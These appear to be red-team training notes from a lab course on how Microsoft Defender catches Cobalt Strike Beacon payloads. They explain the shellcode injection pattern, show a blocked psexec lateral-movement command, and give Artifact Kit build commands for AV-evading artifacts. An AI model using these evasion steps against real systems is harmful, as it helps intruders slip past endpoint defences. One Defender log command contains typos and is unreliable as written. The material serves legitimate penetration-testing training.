# Defender Antivirus

Microsoft Defender is pre-installed with Windows (both desktop and server editions), which has become a formidable defense. There are three facets to its detection capability to be explored:

* On-disk
* In-memory
* Behavioural

It's useful to understand how payloads are generated in CS. Beacon is written as a reflective DLL, so there's the core Beacon DLL (everything that make Beacon actually function) plus a reflective loader component. Those are then converted into position independent shellcode, which when injected and executed, calls the reflective loader entry point. The reflective loader then loads the Beacon DLL into memory and kicks off a new thread to run it.

    Reflective Loader + Beacon DLL --> Shellcode

Settings from the Malleable C2 profile (e.g. callback addresses) are stamped into the DLL when payloads are generated; the shellcode is generated, XOR'd, then stamped into them. The artifacts act as "simple" shellcode injectors. They all, with the exception of the service binary, inject Beacon shellcode into themselves.

    XOR'd shellcode --> Allocate RW memory --> Decode shellcode --> Write memory --> Change memory to RX --> Create thread

The service binary is identical to this, except that it spawns another process and performs remote injection instead. 

The complication when trying to bypass AV signatures is knowing which "part" of the payload they apply to - the core Beacon, the reflective loader, or the artifact.

## Artifact Kit

Though dropping files to disk has a bad reputation, it's sometimes unavoidable to use certain tactics (e.g. show that we have access to the File Server, but we can't PsExec to it because the default service binary payload is detected by Defender).

    beacon> ls \\fs.dev.cyberbotic.io\c$
    beacon> jump psexec64 fs.dev.cyberbotic.io smb
    [-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225
    PS C:\Users\Attacker> net helpmsg 225
    Operation did not complete successfully because the file contains a virus or potentially unwanted software.

If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected.

    PS C:\Users\Attacker> copy C:\Payloads\smb_x64.svc.exe .\Desktop\
    PS C:\Users\Attacker> Get-MpTreatDetection | sory $_.InitialDetectionTime | select -first 1

The Cobalt Strike artifacts in the output are nothing more than shellcode runners that inject Beacon shellcode when executed. As a rule of thumb, they inject the shellcode into themselves (e.g. using the VirtualAlloc & CreateThread pattern). The service binary is the one exception, as it spawns a new process and injects the shellcode into that instead. So when moving laterally with PsExec, the artifact can be deleted from disk immediately.

The Artifact Kit contains the source code for these artifacts and is designed to facilitate the development of sandbox-safe injectors. The idea is to develop artifacts that inject Beacon shellcode in a way that cannot be emulated by AV engines. There are several bypass techniques provided with the kit which you can modify, or you can implement entirely new ones yourself. Where the Artifact Kit does not help is with making Beacon resilient to detection once it's running in memory (e.g. from memory scanners).

The kit can be found in C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

The code for the entry point of each artifact format (i.e. EXE and DLL) can be found in src-main. These include dllmain.c for the DLL artifacts, main.c for the EXE artifacts, and svcmain.c for the Service EXE artifacts. These just call a function called start, so you should not need to modify these files in most cases. The implementation of this function can be found in each bypass file.

These can be found in src-common and are named bypass-<technique>.c.  The included ones are:

* mailslot - reads the shellcode over a mailslot.
* peek - uses a combination of Sleep, PeekMessage and GetTickCount.
* pipe - reads the shellcode over a named pipe.
* readfile - artifact reads itself from disk and seeks to find the embedded shellcode.

Before making any modifications to the kit, let's just build one of these variants as it is. The kit includes a build script which uses mingw to compile the artifacts.

    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
    [Artifact kit] [-] Usage:
    [Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
    [Artifact kit] [-]  - Techniques       - a space separated list
    [Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
    [Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
    [Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
    [Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
    [Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
    [Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
    [Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
    [Artifact kit] [-]  - Resource File    - true or false to include the resource file
    [Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
    [Artifact kit] [-]  - Syscalls         - set the system call method
    [Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
    [Artifact kit] [-]  - Output Directory - Destination directory to save the output
    [Artifact kit] [-] Example:
    [Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact

Review the README.md file inside the Artifact Kit directory for more information. Let's build a new set of artifact templates using the bypass-pipe technique:
    
    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
    ...
    [Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'





